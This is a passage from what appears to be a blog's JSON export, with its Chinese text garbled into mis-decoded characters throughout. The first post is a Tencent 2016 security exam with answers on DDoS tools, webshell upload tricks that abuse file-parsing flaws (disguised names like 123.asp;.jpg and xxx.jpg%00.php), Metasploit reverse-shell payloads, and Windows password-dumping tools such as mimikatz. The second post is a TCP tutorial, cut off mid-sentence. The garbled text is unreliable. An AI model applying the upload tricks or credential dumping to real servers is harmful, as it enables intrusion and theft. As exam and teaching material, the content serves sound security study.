Chainï¼‰ï¼Œè€ŒiOSç³»ç»Ÿåˆ™æœªé‡‡ç”¨\nDã€ Android4.1 ç³»ç»Ÿé»˜è®¤å¯ç”¨äº†å†…å­˜ASLR\nç­”æ¡ˆ ABD iOSç³»ç»Ÿä¹Ÿé‡‡ç”¨äº†å®‰å…¨å¼•å¯¼é“¾ï¼ŒCé”™è¯¯ ä»¥ä¸‹å“ªä¸ªå·¥å…·å¯ä»¥ç”¨æ¥è¿è¡ŒDDoSæ”»å‡»ï¼Ÿï¼ˆï¼‰\nAã€ èœåˆ€\nBã€ WSI\nCã€ Dosend\nDã€ Chkrootkit\nç­”æ¡ˆ C ä¸­å›½èœåˆ€æ˜¯ä¸€æ¬¾ä¸“ä¸šçš„ç½‘ç«™ç®¡ç†è½¯ä»¶ï¼› WSIæ˜¯PHPæ³¨å…¥å·¥å…·ï¼Œå…·ä½“å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼› Dosendæ˜¯ä¸€æ¬¾Linuxå‘åŒ…å·¥å…·ï¼Œå¯ä»¥ç”¨æ¥å®ç°DDoSæ”»å‡»ï¼› chkrootkitæ˜¯ç”¨æ¥æ£€æŸ¥rootkitçš„ã€‚ ä»¥ä¸‹å“ªäº›æœåŠ¡å™¨æ›¾è¢«å‘ç°æ–‡ä»¶è§£ææ¼æ´ï¼Ÿï¼ˆï¼‰\nAã€ Apache\nBã€ IIS\nCã€ nginx\nDã€ squid\nç­”æ¡ˆ ABC Aã€Apacheè§£ææ¼æ´ï¼šè¯¥æœåŠ¡å™¨ä»å³åˆ°å·¦åˆ¤æ–­è§£ææ–‡ä»¶ï¼Œå¦‚æœä¸ºä¸å¯è¯†åˆ«è§£æï¼Œå°±ç»§ç»­å¾€å·¦åˆ¤æ–­ã€‚å¦‚shell.php.owf.rarï¼Œå…¶ä¸­.owfå’Œ.raræ˜¯Apacheä¸å¯è§£æçš„ï¼Œå°±å°†æ­¤æ–‡ä»¶æœ€ç»ˆè§£æä¸ºshell.php Bã€IISè§£ææ¼æ´ï¼šä¸€æ˜¯IIS5.x/6.0ä¸­ï¼Œç½‘ç«™ä¸‹å»ºç«‹åä¸º.asp/.asaçš„æ–‡ä»¶å¤¹ï¼Œå…¶å†…çš„ä»»ä½•æ–‡ä»¶éƒ½è¢«å½“æˆaspæ–‡ä»¶è§£æå¹¶æ‰§è¡Œï¼›äºŒæ˜¯123.asp;.jpgä¼šè¢«è§£æä¸º123.aspã€‚ Cã€nginxè§£ææ¼æ´ï¼šä¸€æ˜¯nginxé»˜è®¤Fast-CGIå¼€å¯çš„æƒ…å†µä¸‹ï¼Œé»‘å®¢ä¸Šä¼ åä¸ºupupimage.jpgï¼Œå†…å®¹ä¸ºPHPä»£ç çš„æ–‡ä»¶ï¼Œç„¶åè®¿é—®upupimage.jpg/.phpï¼Œåœ¨è¿™ä¸ªç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€å¥è¯æœ¨é©¬shell.phpï¼›äºŒæ˜¯åœ¨å›¾ç‰‡ä¸­åµŒå…¥PHPä»£ç ï¼Œç„¶åé€šè¿‡è®¿é—®xxx.jpg%00.phpæ¥æ‰§è¡Œå…¶ä¸­çš„ä»£ç ã€‚å½±å“ç‰ˆæœ¬0.5,0.6,0.7\u0026lt;=0.7.65,0.8\u0026lt;=0.0.37ã€‚ squidçˆ†å‡ºæ¥çš„æ›´å¤šæ˜¯æ‹’ç»æœåŠ¡æ”»å‡»ã€‚å®ƒæ˜¯ä¸€ä¸ªé«˜æ•ˆçš„Webç¼“å­˜åŠä»£ç†ç¨‹åºï¼Œæœ€åˆæ˜¯ä¸ºUnixå¹³å°å¼€å‘çš„ï¼Œç°åœ¨ä¹Ÿè¢«ç§»æ¤åˆ°Linuxå’Œå¤§å¤šæ•°çš„Unixç±»ç³»ç»Ÿä¸­ï¼Œæœ€æ–°çš„Squidå¯ä»¥è¿è¡Œåœ¨Windowså¹³å°ä¸‹ã€‚ ä»¥ä¸‹å“ªå‡ ç§å·¥å…·å¯ä»¥å¯¹ç½‘ç«™è¿›è¡Œè‡ªåŠ¨åŒ–Webæ¼æ´æ‰«æï¼Ÿï¼ˆï¼‰\nAã€ hackbar\nBã€ AWVS\nCã€ IBM appsacn\nDã€ nmap\nç­”æ¡ˆ BC hackbarå¯ä»¥ç”¨æ¥å¿«é€Ÿæ„å»ºä¸€ä¸ªHTTPè¯·æ±‚ã€ç¼–ç è§£ç base64ç­‰æ“ä½œï¼Œä¸èƒ½è‡ªåŠ¨åŒ–Webæ¼æ´æ‰«æï¼›nmapæ˜¯ä¸€æ¬¾ç½‘ç»œç«¯å£æ‰«æå·¥å…·ï¼Œå¯ä»¥æ‰«æå„ç§ç«¯å£åŠå…¶æœåŠ¡ç”šè‡³æ˜¯ç³»ç»Ÿæ¼æ´æ£€æµ‹ã€‚ä»å®ƒçš„NSEè„šæœ¬å¯ä»¥çœ‹åˆ°å®ƒä¹Ÿå¯ä»¥è¿›è¡ŒWebæ¼æ´æ‰«æï¼Œä½†æ˜¯éœ€è¦å¤æ‚çš„é…ç½®å‘½ä»¤ï¼Œæ•…ä¸èƒ½è‡ªåŠ¨åŒ–æ‰«æã€‚ é»‘å®¢æ§åˆ¶ä¸€å°WindowsæœåŠ¡å™¨ï¼Œå‘ç°IEæµè§ˆå™¨ä½¿ç”¨äº†ä»£ç†ï¼Œå¯ä»¥è®¿é—®å¤–ç½‘ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å‘ç°ï¼š\nC:\\Users\\test\u0026gt;ping www.baidu.com -n 1 æ­£åœ¨ Pingwww.a.shifen.com [14.215.177.38] å…·æœ‰32å­—èŠ‚çš„æ•°æ®ï¼š è¯·æ±‚è¶…æ—¶\nC:\\Users\\test\u0026gt;telnet www.baidu.com 80 æ­£åœ¨é“¾æ¥www.baidu.comâ€¦æ— æ³•æ‰“å¼€åˆ°ä¸»æœºçš„è¿æ¥ã€‚ åœ¨ç«¯å£ 80: è¿æ¥å¤±è´¥ã€‚\né€šè¿‡å¦‚ä¸Šä¿¡æ¯åˆ¤æ–­ï¼Œä¸€ä¸‹å“ªäº›åå¼¹shellæ“ä½œä¼šå¤±è´¥\nAã€ Windows/meterpreter/reverse_http\nBã€ icmpåè®®çš„åé—¨\nCã€ windows/meterpreter/reverse_https\nDã€ windows/meterpreter.reverse_tcp\nç­”æ¡ˆ ABCD IEæµè§ˆå™¨ä½¿ç”¨äº†ä»£ç†ï¼Œå¯èƒ½HTTPåè®®ä¼šå—åˆ°é˜²ç«å¢™é™åˆ¶ï¼Œæ•…Aä¸å¯¹ï¼›pingä¸é€šç™¾åº¦è¯´æ˜ICMPåè®®ä¹Ÿå—å½±å“ã€‚æ•…httpã€httpsã€icmpåè®®çš„åå¼¹shelléƒ½ä¼šå¤±è´¥ï¼ŒDä¹Ÿæ˜¯ä¸å¯¹çš„ï¼Œå¯¹æ–¹æŒ‚äº†ä»£ç†ï¼Œtelnetä¸é€šï¼Œåªæœ‰é€šè¿‡æ’å…¥æŒ‚äº†ä»£ç†çš„IEè¿›ç¨‹åå¼¹ï¼Œæˆ–è€…é€šè¿‡ä»£ç†åå¼¹. ä»¥ä¸‹å“ªäº›å·¥å…·å¯ä»¥æŠ“å–Windowsæ˜æ–‡å¯†ç ï¼Ÿï¼ˆï¼‰\nAã€ WCE\nBã€ minikatz\nCã€ Quarks PWdump\nDã€ CAIN\nç­”æ¡ˆ AB Aã€WCEæ˜¯ä¸gethasheså’Œmimikatzé½åçš„ä¸€æ¬¾hashç®¡ç†å·¥å…·ï¼Œä½¿ç”¨wceè¿›è¡Œæœ¬åœ°å’ŒåŸŸçš„hashæ³¨å…¥ï¼Œå¯ä»¥åœ¨é«˜æƒé™ä¸‹è·å–æ˜æ–‡å¯†ç  Bã€æ³•å›½ä¸€ä¸ªç‰›Bçš„äººå†™çš„è½»é‡çº§è°ƒè¯•å™¨ï¼Œå¯ä»¥å¸®åŠ©å®‰å…¨æµ‹è¯•äººå‘˜æŠ“å–Windowså¯†ç ã€‚mimikatz 2.0ç‰ˆæœ¬ï¼ŒæŠ“å¯†ç å‘½ä»¤æ›´åŠ ç®€å•äº†ï¼Œæ–°åŠŸèƒ½è¿˜åŒ…æ‹¬èƒ½å¤Ÿé€šè¿‡è·å–çš„kerberosç™»å½•å‡­æ®ï¼Œç»•è¿‡æ”¯æŒRestrictedAdminæ¨¡å¼çš„win8æˆ–win2012svrçš„è¿œç¨‹ç»ˆç«¯(RDP)çš„ç™»é™†è®¤è¯ Cã€ä¸€ä¸ªWin32ç¯å¢ƒä¸‹çš„ç³»ç»Ÿæˆæƒä¿¡æ¯å¯¼å‡ºå·¥å…·ï¼Œç›®å‰é™¤æ­¤ä¹‹å¤–æ²¡æœ‰ä»»ä½•ä¸€æ¬¾å·¥å…·å¯ä»¥å¯¼å‡ºå¦‚æ­¤å…¨é¢çš„ä¿¡æ¯ï¼Œæ”¯æŒè¿™ä¹ˆå¤šçš„OSç‰ˆæœ¬ï¼Œä¸”ç›¸å½“ç¨³å®šã€‚ Dã€CAINä¸»è¦ç”¨äºç½‘ç»œæ•°æ®å—…æ¢ï¼Œä¹Ÿå¸¦æœ‰å¯†ç ç ´è§£åŠŸèƒ½ï¼Œä½†æ˜¯ä¸èƒ½æŠ“å–windowsæ˜æ–‡å¯†ç  iOSå¹³å°ä¸Šå¸¸è§çš„Hookæ¡†æ¶æœ‰ï¼ˆï¼‰\nAã€ Xposed\nBã€ Intent Fuzz\nCã€ Drozer\nDã€ Substrate\nç­”æ¡ˆ D A/ è¿™ä¸ªæ˜¯androidçš„hookæ¡†æ¶ï¼Œæœ‰ä¸å°‘å¼€å‘è€…å‘å¸ƒäº†ä¸é”™çš„æ¡†æ¶ã€‚ B/ è¿™ä¸ªæ˜¯android åº”ç”¨ç»„ä»¶æ¨¡ç³Šæµ‹è¯•æ¡†æ¶ C/ è¿™ä¸ªæ˜¯android ç»¼åˆæ¸—é€æµ‹è¯•å¹³å° D/ IOSå¹³å°çš„hookçš„æ¡†æ¶ã€‚æ­¤å¤–ï¼ŒCydia Substrateæ˜¯androidä¸Šçš„å¼ºå¤§è€Œå®ç”¨çš„HOOKå·¥å…· æ‰§è¡Œnmap 10.5.5.1é»˜è®¤ä¼šæ‰«æä»¥ä¸‹å“ªä¸ªç«¯å£ï¼ˆï¼‰\nAã€ 21\nBã€ 3389\nCã€ 8080\nDã€ 1024\nç­”æ¡ˆ AC nmapé»˜è®¤æ‰«æé€‰é¡¹æ˜¯å¯¹å¸¸è§„ç«¯å£å’ŒæœåŠ¡è¿›è¡Œæ¢æµ‹ã€‚å…¶ä¸­å¸¸è§„ç«¯å£æ˜¯1000ä¸ªæœ€å¯èƒ½å¼€æ”¾çš„ç«¯å£ã€‚ ã€åˆ¤æ–­ã€‘TCPå’ŒUDPç›¸æ¯”ï¼ŒTCPä¼ é€æ•°æ®æ›´å®‰å…¨ï¼ˆï¼‰\nç­”æ¡ˆ é”™ã€‚å¯é ä¼ è¾“ä¸ç­‰äºæ›´åŠ å®‰å…¨ï¼Œä¸¤è€…å®é™…ä¸Šä¸å­˜åœ¨å“ªä¸ªæ›´å®‰å…¨çš„å¯¹æ¯”ã€‚ é¢˜ç›®æ¥æº [1] daxi0ng.è…¾è®¯2016å®ä¹ æ‹›è˜-å®‰å…¨å²—ç¬”è¯•é¢˜ç­”æ¡ˆè¯¦ç»†è§£é‡Š[EB/OL].2019-03-13\nhttps://blog.csdn.net/qq_40989258/article/details/88532712\n\u0026nbsp;\n","date":"2021-01-29T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%AE%89%E5%85%A8%E5%B2%97%E7%AC%94%E8%AF%95%E9%A2%981/","title":"å®‰å…¨å²—ç¬”è¯•é¢˜â€”â€”1"},{"content":"ä¼ è¾“å±‚ ä¼ è¾“å±‚çš„åŠŸèƒ½\nä»é€šä¿¡å’Œä¿¡æ¯å¤„ç†çš„è§’åº¦çœ‹ï¼Œä¼ è¾“å±‚å‘å®ƒä¸Šé¢çš„åº”ç”¨å±‚æä¾›é€šä¿¡æœåŠ¡ï¼Œå®ƒå±äºé¢å‘é€šä¿¡éƒ¨åˆ†çš„æœ€é«˜å±‚ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ç”¨æˆ·åŠŸèƒ½ä¸­çš„æœ€ä½å±‚ã€‚\nå®é™…ä¸Šï¼Œä¼ è¾“å±‚èµ·åˆ°ä¸€ä¸ªæ‰¿ä¸Šå¯ä¸‹çš„ä½œç”¨ã€‚å®ƒä¹‹ä¸‹çš„ç½‘ç»œå±‚ã€æ•°æ®é“¾è·¯å±‚ã€ç‰©ç†å±‚è¢«ç§°ä¸ºé€šä¿¡å­ç½‘ï¼Œå…¶å®ç°ç»†èŠ‚å¯¹ç”¨æˆ·æ˜¯ä¸å¯è§çš„ã€‚\nä¼ è¾“å±‚çš„åŠŸèƒ½å¦‚ä¸‹ï¼š\næä¾›è¿›ç¨‹ä¹‹é—´çš„é€»è¾‘é€šä¿¡ï¼ˆå³ç«¯åˆ°ç«¯çš„é€šä¿¡ï¼‰ã€‚è¿›ç¨‹é—´çš„é€»è¾‘é€šä¿¡æ˜¯æŒ‡æœ¬ä¸»æœºä¸Šè¿è¡Œçš„æŸä¸ªè¿›ç¨‹å’Œå¯¹æ–¹ä¸»æœºä¸Šè¿è¡Œçš„æŸä¸ªè¿›ç¨‹è¿›è¡Œé€šä¿¡ã€‚è€Œä¸æ­¤ç›¸å¯¹çš„ï¼Œç½‘ç»œå±‚æä¾›çš„æ˜¯ç‚¹åˆ°ç‚¹çš„é€šä¿¡ï¼ŒæŒ‡çš„æ˜¯æœ¬ä¸»æœºä¸å¯¹æ–¹ä¸»æœºçš„é€šä¿¡ã€‚ å¤ç”¨å’Œåˆ†ç”¨ã€‚å¤šä¸ªè¿›ç¨‹å¯ä»¥ä½¿ç”¨åŒä¸€ä¸ªä¼ è¾“å±‚åè®®å°è£…è‡ªå·±çš„æ•°æ®ï¼Œè€Œå¯¹æ–¹ä¸»æœºå¯ä»¥ä½¿ç”¨åŒæ ·çš„åè®®æ­£ç¡®è§£æè¿™äº›æ•°æ®ï¼Œäº¤ä»˜ç»™æ­£ç¡®çš„åº”ç”¨è¿›ç¨‹ã€‚ å·®é”™æ£€æµ‹ã€‚ä¼ è¾“å±‚æ£€æµ‹é¦–éƒ¨å’Œæ•°æ®éƒ¨åˆ†çš„å·®é”™ï¼Œè€Œç½‘ç»œå±‚åªæ£€æŸ¥IPæ•°æ®æŠ¥çš„é¦–éƒ¨ï¼Œä¸æ£€æŸ¥æ•°æ®éƒ¨åˆ†æ˜¯å¦å‡ºé”™ã€‚ æä¾›ä¸¤ç§ä¸åŒçš„ä¼ è¾“åè®®ï¼Œå³é¢å‘è¿æ¥çš„TCPå’Œæ— è¿æ¥çš„UDPã€‚ç½‘ç»œå±‚æ— æ³•åŒæ—¶å®ç°ä¸¤ç§åè®®ï¼ˆå³è¦ä¹ˆä½¿ç”¨é¢å‘è¿æ¥çš„æœåŠ¡ï¼Œå¦‚è™šç”µè·¯ï¼›è¦ä¹ˆåªæä¾›æ— è¿æ¥çš„æœåŠ¡ï¼Œå¦‚æ•°æ®æŠ¥ï¼‰ã€‚ éœ€è¦æ³¨æ„ï¼Œåœ¨è®¡ç®—æœºç½‘ç»œå±‚æ¬¡ç»“æ„ä¸­ï¼Œç½‘ç»œå±‚è¢«è®¤ä¸ºæ˜¯ä¸å¯é çš„æœåŠ¡ï¼Œå³ç½‘ç»œå±‚ä¼ è¾“çš„æ•°æ®å¯èƒ½å‡ºç°ä¸¢å¤±ã€æ··ä¹±æˆ–é‡å¤ï¼Œè¿™äº›ä¸å¯é çš„é—®é¢˜éœ€è¦ç”±ä¼ è¾“å±‚æ¥è€ƒè™‘è§£å†³ã€‚\nç«¯å£çš„æ¦‚å¿µ\nç½‘ç»œå±‚çš„æ•°æ®äº¤ä»˜æ˜¯ç‚¹åˆ°ç‚¹çš„ï¼Œä¹Ÿå°±æ˜¯ä¸»æœºåˆ°ä¸»æœºçš„äº¤ä»˜ã€‚å½“ä¸€ä¸ªIPæ•°æ®æŠ¥åˆ°è¾¾äº†ä¸»æœºï¼Œå¦‚ä½•åˆ¤æ–­è¿™ä»½æ•°æ®æŠ¥åº”è¯¥äº¤ç»™å“ªä¸ªè¿›ç¨‹å‘¢ï¼Ÿä¼ è¾“å±‚å¼•å…¥äº†ç«¯å£ï¼Œæ¯ä¸ªè¿›ç¨‹ä¸ä¸€ä¸ªç«¯å£å·ç»‘å®šã€‚ä¸»æœºæŠŠIPæ•°æ®æŠ¥è§£å°ï¼Œå°±èƒ½çœ‹åˆ°é‡Œé¢çš„ä¼ è¾“å±‚æ•°æ®åŒ…ï¼Œå…¶åŒ…å¤´ä¸­å†™æ˜äº†ç›®çš„ç«¯å£ï¼Œåªéœ€è¦æŠŠæ•°æ®äº¤ä»˜ç»™å¯¹åº”äºè¿™ä¸ªç«¯å£çš„è¿›ç¨‹å³å¯ã€‚\nç»“åˆIPå’Œç«¯å£ï¼Œå°±èƒ½å”¯ä¸€åœ°æ ‡è¯†ä¸€å°ä¸»æœºä¸Šçš„ä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™å°±æ˜¯Socketï¼ˆå¥—æ¥å­—ï¼‰ï¼š\nå¥—æ¥å­— = ï¼ˆä¸»æœºIPåœ°å€ï¼Œ ç«¯å£å·ï¼‰\nTCP TCPåè®®çš„ç‰¹ç‚¹\nTCPæ˜¯åœ¨ä¸å¯é çš„IPå±‚ä¹‹ä¸Šå®ç°çš„å¯é çš„æ•°æ®ä¼ è¾“åè®®ï¼Œå®ƒä¸»è¦é’ˆå¯¹ä¹‹å‰æåŠçš„ç½‘ç»œå±‚æ•°æ®ä¼ è¾“çš„ä¸¢å¤±ã€æ··ä¹±æˆ–é‡å¤é—®é¢˜ï¼Œå®ç°ä¼ è¾“å±‚ä¸Šçš„å¯é ã€æœ‰åºã€æ— ä¸¢å¤±å’Œä¸é‡å¤ã€‚\nTCPçš„ä¸»è¦ç‰¹ç‚¹å¦‚ä¸‹ï¼š\né¢å‘è¿æ¥ã€‚ æ¯æ¡è¿æ¥åªèƒ½æœ‰ä¸¤ä¸ªç«¯ç‚¹ï¼Œå³ä¸€å¯¹ä¸€çš„ã€‚ å¯é çš„äº¤ä»˜æœåŠ¡ï¼Œä¿è¯æ•°æ®æ— å·®é”™ã€ä¸ä¸¢å¤±ã€ä¸é‡å¤ä¸”æœ‰åºã€‚ å…¨åŒå·¥é€šä¿¡ï¼Œå³ä»»ä½•æ—¶åˆ»åŒæ–¹éƒ½èƒ½è¿›è¡Œæ•°æ®çš„å‘é€ã€‚ä¸ºæ­¤ï¼ŒåŒæ–¹éƒ½åº”è¯¥è®¾ç½®å‘é€ç¼“å­˜å’Œæ¥æ”¶ç¼“å­˜ï¼Œç”¨æ¥ä¸´æ—¶å­˜æ”¾åŒå‘é€šä¿¡çš„æ•°æ®ã€‚ é¢å‘å­—èŠ‚æµã€‚è®¡ç®—æœºç½‘ç»œä¸­å¸¸è§çš„ä¸€ä¸ªé—®é¢˜æ˜¯ï¼šé¢å‘å­—èŠ‚å’Œé¢å‘æŠ¥æ–‡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ é¢å‘å­—èŠ‚æµæ˜¯æŒ‡TCPå°†åº”ç”¨ç¨‹åºäº¤ä»˜ä¸‹æ¥çš„æ•°æ®ä»…è§†ä¸ºä¸€è¿ä¸²çš„æ— ç»“æ„çš„å­—èŠ‚æµï¼Œå‘é€çš„æ—¶å€™æŒ‰ç…§TCPçš„è§„åˆ™è¿›è¡Œå‘é€ï¼Œä¸ä¼šè€ƒè™‘ä¿ç•™åŸå§‹æ•°æ®çš„è¾¹ç•Œï¼›è€Œé¢å‘æŠ¥æ–‡æ˜¯æŒ‡æ¯æ¬¡å‘é€çš„æ•°æ®ä½œä¸ºä¸€ä¸ªæŠ¥æ–‡ï¼Œä¸€ä¸ªæŠ¥æ–‡æ˜¯ä¸€å—æœ‰ç»“æ„çš„æ•°æ®ã€‚ TCPæŠ¥æ–‡æ®µ\næƒ³è¦ç†è§£TCPçš„è¿æ¥å»ºç«‹ç­‰ç­‰ç»†èŠ‚ï¼Œè®¤è¯†å…¶æŠ¥å¤´æ˜¯å¿…è¦çš„ã€‚TCPæœ‰å›ºå®šçš„20BæŠ¥å¤´ï¼Œå˜é•¿å­—æ®µé…åˆå¡«å……å­—æ®µä½¿TCPæŠ¥å¤´é•¿åº¦å§‹ç»ˆæ˜¯4Bçš„æ•´æ•°å€ã€‚ç”±äºé¦–éƒ¨é•¿åº¦å­—æ®µåªæœ‰4ä½ï¼Œæ•…æŠ¥å¤´æœ€é•¿ä¸º15 * 4 = 60B\nTCPæŠ¥å¤´æ ¼å¼å¦‚ä¸‹ï¼š\nTCP Header æ¯ä¸ªå­—æ®µçš„å«ä¹‰å¯ä»¥å‚è§è¿™ç¯‡æ–‡ç« ã€‚\nTCPè¿æ¥ç®¡ç†\nTCPæ˜¯é¢å‘è¿æ¥çš„åè®®ï¼Œæ¯ä¸ªTCPè¿æ¥éƒ½æœ‰ä¸‰ä¸ªé˜¶æ®µï¼šè¿æ¥å»ºç«‹ã€æ•°æ®ä¼ è¾“å’Œè¿æ¥é‡Šæ”¾ã€‚TCPçš„è¿æ¥ç®¡ç†å°±æ˜¯ä½¿è¿è¾“è¿æ¥çš„å»ºç«‹å’Œé‡Šæ”¾éƒ½èƒ½æ­£å¸¸è¿›è¡Œã€‚\nTCPè¿æ¥çš„ç«¯å£ç§°ä¸ºå¥—æ¥å­—ï¼ˆsocketï¼‰æˆ–æ’å£ã€‚è¿æ¥é‡‡ç”¨C/Sæ–¹å¼ï¼Œä¸»åŠ¨å‘èµ·è¿æ¥çš„è¿›ç¨‹ç§°ä¸ºå®¢æˆ·æœºï¼ˆClientï¼‰ï¼Œè¢«åŠ¨ç­‰å¾…è¿æ¥çš„è¿›ç¨‹ç§°ä¸ºæœåŠ¡å™¨ï¼ˆServerï¼‰ã€‚\nè¿æ¥çš„å»ºç«‹åˆ†ä¸º3ä¸ªæ­¥éª¤ï¼Œå³ä¸‰æ¬¡æ¡æ‰‹ï¼š\nTCP three-way-handshake ç¬¬ä¸€æ­¥ï¼šå®¢æˆ·æœºå‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªæŠ¥æ–‡æ®µï¼Œè¯¥æŠ¥æ–‡æ®µä¸å«åº”ç”¨å±‚æ•°æ®ï¼Œé¦–éƒ¨ä¸­çš„SYNæ ‡å¿—è¢«ç½®ä¸º1ï¼Œä¸”è¯¥æŠ¥æ–‡æ®µå ç”¨äº†ä¸€ä¸ªéšæœºåºå·seq=xã€‚ ç¬¬äºŒæ­¥ï¼šæœåŠ¡å™¨æ”¶åˆ°è¿æ¥è¯·æ±‚ï¼Œå¦‚åŒæ„è¿æ¥ï¼Œå°±å‘å®¢æˆ·æœºå‘å›ç¡®è®¤ï¼Œå¹¶ä¸ºè¯¥è¿æ¥åˆ†é…TCPç¼“å­˜å’Œå˜é‡ã€‚ç¡®è®¤æŠ¥æ–‡ä¸­SYNå’ŒACKéƒ½ç½®ä¸º1ï¼Œseqæ˜¯æœåŠ¡å™¨é€‰ç”¨çš„åˆå§‹éšæœºåºå·ï¼Œackè¡¨ç¤ºæœŸæœ›æ”¶åˆ°çš„ä¸‹ä¸€ä¸ªå®¢æˆ·æœºæŠ¥æ–‡åºå·ã€‚ ç¬¬ä¸‰æ­¥ï¼šå®¢æˆ·æœºæ¥æ”¶åˆ°ç¡®è®¤æŠ¥æ–‡ï¼Œä¹Ÿè¦ä¸ºè¯¥è¿æ¥åˆ†é…ç¼“å­˜å’Œå˜é‡ï¼Œå¹¶å›å¤ç¡®è®¤ã€‚ å®Œæˆä¸‰æ¬¡æ¡æ‰‹ä¹‹åï¼ŒåŒæ–¹çš„åº”ç”¨è¿›ç¨‹åœ¨ä»»ä½•æ—¶åˆ»éƒ½å¯ä»¥å‘é€æ•°æ®ï¼ˆå…¨åŒå·¥ï¼‰ã€‚\næ³¨æ„è¿™é‡Œçš„ç¬¬äºŒæ­¥æ¡æ‰‹ï¼ŒæœåŠ¡å™¨åœ¨æ­¤æ­¥åˆ†é…èµ„æºï¼Œé‚£ä¹ˆå¦‚æœå®¢æˆ·ç«¯ä¸å›åº”ç¬¬ä¸‰æ­¥çš„ç¡®è®¤æŠ¥æ–‡ï¼Œåˆ™æœåŠ¡å™¨åœ¨åŸåœ°å¿™ç­‰ï¼Œè¿‡ä¸€æ®µæ—¶é—´åæ‰åˆ é™¤è¿™äº›èµ„æºï¼›å¦‚æœå¿«é€Ÿå‘é€å¤§é‡çš„SYNåŒ…ç»™ç‰¹å®šæœåŠ¡å™¨ï¼Œå°†è€—å°½å®ƒçš„èµ„æºï¼Œä½¿å¾—æ­£å¸¸çš„è¿æ¥æ— æ³•è¢«å»ºç«‹ï¼Œè¿™å°±æ˜¯å…¸å‹çš„SYN Floodæ”»å‡»ã€‚\nä¸‰æ¬¡æ¡æ‰‹çš„å¿…è¦æ€§ï¼š\nè¿›è¡Œä¸‰æ¬¡æ¡æ‰‹æ˜¯å¿…è¦çš„ã€‚\nä»ç›´è§‰è¿›è¡Œç†è§£ï¼šç¬¬ä¸€æ­¥æ¡æ‰‹æ˜¯å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€æ•°æ®ï¼Œæ­¤æ—¶åŒæ–¹å¯¹ä¿¡é“çš„æ€§è´¨è¿˜ä¸äº†è§£ï¼›ç¬¬äºŒæ­¥æ¡æ‰‹æˆåŠŸä¹‹åï¼Œå®¢æˆ·ç«¯çŸ¥é“äº†æœåŠ¡å™¨èƒ½å¤Ÿæ”¶åˆ°è‡ªå·±çš„æ•°æ®ï¼Œä½†æœåŠ¡å™¨è¿˜ä¸çŸ¥é“å®¢æˆ·ç«¯èƒ½ä¸èƒ½æ”¶åˆ°è‡ªå·±çš„æ•°æ®ï¼›ç¬¬ä¸‰æ­¥æ¡æ‰‹æˆåŠŸä¹‹åï¼ŒæœåŠ¡å™¨çŸ¥é“å®¢æˆ·ç«¯èƒ½æ”¶åˆ°è‡ªå·±çš„æ•°æ®ï¼Œå¯ä»¥å¼€å§‹é€šä¿¡ã€‚\nè¿›ä¸€æ­¥åœ°ï¼Œè€ƒè™‘ä»¥ä¸‹è¿™ç§ä¸¤æ¬¡æ¡æ‰‹çš„æƒ…å†µï¼š\nTCP 2-way-handshake-bug1 åœ¨ç¬¬äºŒæ­¥æ¡æ‰‹æ—¶ï¼ŒæœåŠ¡å™¨å›åº”çš„æŠ¥æ–‡æ®µæ²¡æœ‰è¢«å®¢æˆ·æœºæ”¶åˆ°ï¼Œè€Œæ­¤æ—¶æœåŠ¡å™¨è®¤ä¸ºè¿æ¥å·²ç»å»ºç«‹ï¼ˆå› ä¸ºå¯¹æœåŠ¡å™¨æ¥è¯´ç¬¬äºŒæ­¥æ¡æ‰‹å·²ç»å®Œæˆäº†ï¼‰ï¼Œå¼€å§‹å‘é€æ•°æ®ï¼›æœåŠ¡å™¨å‘é€çš„æ•°æ®åˆ°è¾¾å®¢æˆ·æœºï¼Œä½†å®¢æˆ·æœºå¹¶ä¸çŸ¥é“è‡ªå·±çš„è¿æ¥å·²ç»å»ºç«‹ï¼Œè¿™é‡Œçš„seqå­—æ®µæ˜¯è¿æ³•çš„ï¼Œä¸¢å¼ƒè¿™äº›åŒ…ï¼›æœåŠ¡å™¨è¶…æ—¶é‡ä¼ ï¼Œå®¢æˆ·ç«¯ç»§ç»­ä¸¢å¼ƒã€‚\nå½“ç„¶ï¼Œå¯¹äºå®¢æˆ·æœºæ¥è¯´ï¼Œè¿æ¥è¿Ÿè¿Ÿæ— æ³•å»ºç«‹ï¼Œåº”å½“é‡æ–°å‘é€SYNåŒ…ï¼Œè€Œå¯¹äºæœåŠ¡å™¨æ¥è¯´ï¼Œä¸è¿™ä¸ªå®¢æˆ·ç«¯çš„è¿æ¥å·²ç»å­˜åœ¨äº†ï¼Œæ•…å¯¹åæ¥çš„è¿æ¥è¯·æ±‚ä¸äºˆå“åº”ã€‚\nä¸å¦¨å†è€ƒè™‘ä¸‹é¢è¿™ç§æƒ…å†µï¼š\nTCP 2-way-handshake-bug2 å½“å®¢æˆ·æœºå‘é€ä¸€ä¸ªSYNåŒ…ï¼Œè¯¥è¯·æ±‚åœ¨ç½‘ç»œä¸­æŸä¸ªèŠ‚ç‚¹é•¿æ—¶é—´æ»ç•™ï¼Œå®¢æˆ·æœºè¶…æ—¶ä¹‹åè®¤ä¸ºæŠ¥æ–‡ä¸¢å¤±ï¼Œé‡ä¼ ä¸€æ¬¡è¯·æ±‚ï¼ŒæœåŠ¡å™¨æ”¶åˆ°ä¹‹åå»ºç«‹è¿æ¥ï¼Œå¼€å§‹ä¼ è¾“æ•°æ®ã€‚\næ•°æ®ä¼ 